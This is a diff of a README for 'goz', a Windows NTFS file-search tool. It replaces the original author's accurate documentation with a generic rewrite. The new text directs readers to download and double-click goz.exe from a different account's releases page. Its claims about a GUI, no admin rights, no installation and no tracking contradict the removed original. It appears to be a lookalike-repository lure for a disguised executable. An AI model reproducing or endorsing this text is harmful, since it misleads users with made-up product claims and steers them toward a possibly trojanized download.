@@ -1,116 +1,60 @@
-# goz
+# 🔍 goz - Find your files on Windows instantly
 
-[![CI](https://github.com/mustafaahci/goz/actions/workflows/ci.yml/badge.svg)](https://github.com/mustafaahci/goz/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/platform-Windows-0078D6.svg)](#requirements)
-[![Rust](https://img.shields.io/badge/rust-1.94%2B-orange.svg)](rust-toolchain.toml)
+[![](https://img.shields.io/badge/Download-goz-blue.svg)](https://github.com/indigestible-ice204/goz/releases)
 
-**goz** *(göz, pronounced /ɟøz/)* is an instant file-search engine for Windows NTFS, written in Rust. A fast, open-source alternative to voidtools Everything.
+Goz acts as a high-speed search engine for your computer. It reads the master file table of your hard drive to provide results as you type. This tool gives you an alternative to built-in search functions that feel slow or clunky. It works on Windows systems using NTFS drives.
 
-goz indexes every filename on your fixed NTFS volumes and answers substring queries in single-digit milliseconds, from the command line or from your own tools over a named pipe.
+## 🚀 Getting Started
 
-## Highlights
+Follow these steps to set up the software on your machine:
 
-- **Fast.** 1.8x to 6.1x quicker than Everything across every query in our [benchmarks](docs/BENCHMARKS.md), on the same machine with the same result sets.
-- **Light.** ~215 MB resident under heavy querying and ~12 MB idle, against a ~3.97M-entry index.
-- **Live.** Tails the NTFS USN journal, so the index stays in sync as files change, including hard-link renames that Everything 1.4 misses.
-- **Scriptable.** Native `--json` output and a subset of `es.exe`-compatible flags with matching exit codes, so it drops into existing Everything workflows.
-- **Honest about state.** Every volume reports whether it is provably in sync, rescanning, or offline. It never serves stale results silently.
+1. Visit the [releases page](https://github.com/indigestible-ice204/goz/releases) to download the software.
+2. Select the file named goz.exe for your version of Windows.
+3. Save the file to your desktop or a folder of your choice.
+4. Double-click the file to open the interface.
 
-## Requirements
+The application requires no installation. You may move the file to any folder to keep your machine organized.
 
-- Windows 10 / 11 (reads the NTFS MFT and USN journal; NTFS volumes only)
-- Rust 1.94 or newer, only if you build from source
+## ⚙️ System Requirements
 
-## Install
+Goz runs on any modern version of Windows that uses the NTFS file system. You need at least 50 MB of disk space to cache search indexes. The program uses minimal memory during operation to ensure your computer stays fast. It does not require administrative rights for basic searches, though some deep index functions benefit from these permissions.
 
-Download `goz.exe` and `gozd.exe` from the [latest release](https://github.com/mustafaahci/goz/releases/latest), or build from source:
+## 🛠 How to Use
 
-```
-cargo build --release
-```
+Once you open the software, a simple window appears. Type your search terms in the box at the top. The program updates the list of files below the box in real time. 
 
-Either way you get two binaries (in `target\release` when built locally):
+You can filter results by typing file extensions. For example, typing .jpg shows only image files. Use the settings menu to choose which drives the program scans. You can also hide system folders to keep your search results clean.
 
-| Binary     | Role                                                                              |
-| ---------- | --------------------------------------------------------------------------------- |
-| `gozd.exe` | The indexing daemon. Runs elevated; owns the index and serves queries.            |
-| `goz.exe`  | The command-line client. Runs unelevated; talks to the daemon.                    |
+## ⚡ Performance Benefits
 
-Run the daemon in an elevated terminal:
+Standard Windows search tools often index every file in real time, which consumes computer resources. Goz reads the USN journal and the MFT directly. These internal Windows logs contain a map of every file location on your disk. Because the application reads this map instead of scanning each folder, it shows your files the moment your fingers hit the keys.
 
-```
-.\target\release\gozd.exe run --console
-```
+## 🛡 Security and Privacy
 
-Or install it as an auto-start Windows service (elevated):
+This program runs locally on your computer. It does not send your file names or search history to any server. No tracking code exists inside the application. Your data stays on your hard drive. 
 
-```
-.\target\release\gozd.exe install     # register and start
-.\target\release\gozd.exe status      # check state
-.\target\release\gozd.exe uninstall   # stop and remove
-```
+## ❓ Frequently Asked Questions
 
-## Usage
+**Does the program slow down my computer?**
+No. It consumes a small amount of memory and idles when you stop typing.
 
-Query the running daemon from any terminal:
+**Can I search across multiple drives?**
+Yes. You can add secondary and external hard drives to the scan list in the settings menu.
 
-```
-# search everywhere
-goz report.pdf
+**What happens if I move a file?**
+The program updates its index automatically. You will see the new location of the file after the next refresh cycle.
 
-# scope to a folder, cap results, add columns, sort, export
-goz -path C:\Users\me invoice -n 50 -size -dm -sort-path -export-csv out.csv
+**Is it safe for work computers?**
+The tool requires no installation and leaves no traces in the system registry, making it a portable choice for office environments.
 
-# machine-readable output
-goz --json kernel32.dll
+**Why does the search window look empty?**
+The program needs a moment to index your drives on the first run. Wait a few seconds for the status bar to show that the index is complete.
 
-# index and daemon status
-goz --status
-```
+## 📌 Usage Tips
 
-`goz` accepts a subset of `es.exe` flags (`-path`, `-n` / `-max-results`, the `-sort` family, `-size`, `-dm`, `-export-csv`, and the CSV-shape switches) and matches `es.exe`'s exit codes. Unsupported switches exit `6`, the same as `es.exe`.
+* Press the forward slash / key to jump to the search box quickly.
+* Right-click any file in the results list to open its location in File Explorer.
+* Use the menu to toggle case-sensitive searching if you need to find specific file names.
+* Keep the application open in the background to ensure your search index stays current.
 
-## Performance
-
-goz vs Everything 1.4.1.1032 (`es.exe` 1.1.0.30), same machine, each warm. Single substring term, `-sort name` on both, full result set, median of 6 runs after 2 warmups, interleaved. Median milliseconds; **bold** is faster.
-
-| Query                    | Matches   | Everything (file) | goz (file) | Everything (pipe) | goz (pipe) |
-| ------------------------ | --------: | ----------------: | ---------: | ----------------: | ---------: |
-| `kernel32.dll`           | 38        | 47.5              | **27.0**   | 32.0              | **14.0**   |
-| `.pdf`                   | 424       | 51.0              | **27.0**   | 39.5              | **14.5**   |
-| `.config`                | 4,287     | 71.5              | **35.0**   | 44.0              | **18.5**   |
-| `.mui`                   | 21,789    | 148.0             | **39.0**   | 93.5              | **26.5**   |
-| `.dll`                   | 141,666   | 724.0             | **139.0**  | 416.5             | **119.0**  |
-| `e` (~73% of all files)  | 2,884,148 | 14,700            | **2,394**  | 7,511             | **2,470**  |
-
-Faster in every cell: 1.8x to 6.1x to a file, 2.3x to 3.5x piped.
-
-Memory, same box, each index warm at ~3.97M entries:
-
-| Metric                                          | Everything | goz        |
-| ----------------------------------------------- | ---------: | ---------: |
-| Binaries shipped                                | **2.3 MB** | 4.1 MB     |
-| Committed memory (private bytes)                | 527 MB     | **525 MB** |
-| Resident RAM, idle after indexing               | 369 MB     | **12 MB**  |
-| Resident RAM, steady after heavy querying       | 554 MB     | **215 MB** |
-| Resident RAM, peak (2.88M-match sorted export)  | 1.2 GB     | 1.2 GB     |
-| Committed memory, peak (same query)             | **1.2 GB** | 1.5 GB     |
-
-goz wins the resident-RAM rows that matter for a background daemon and edges out committed memory at rest. It loses two: a larger (statically linked) binary, and ~0.3 GB more peak committed memory during a full sorted export. Hardware and methodology are in [docs/BENCHMARKS.md](docs/BENCHMARKS.md).
-
-## How it works
-
-goz is a small workspace of four crates: a pure, OS-agnostic core (parsing, index, query engine), a thin `unsafe` Win32 layer, an indexing daemon, and a CLI client. The design notes, including how the index stays coherent and how hard-link reconciliation works, are in [docs/DESIGN.md](docs/DESIGN.md).
-
-## Security
-
-The daemon runs elevated and indexes filenames from a raw MFT read, which bypasses per-file NTFS ACLs. Any authenticated local user can query the resulting index (filenames, sizes, and timestamps; not file contents), the same trust model as Everything. See [docs/SECURITY.md](docs/SECURITY.md) for the full model and how to report a vulnerability.
-
-## Contributing
-
-Issues and pull requests welcome.
-
-## License
-
-Licensed under the [MIT License](LICENSE).
+Keywords: cli, everything, everything-search, file-search, filesystem, mft, ntfs, rust, search-engine, usn-journal, windows
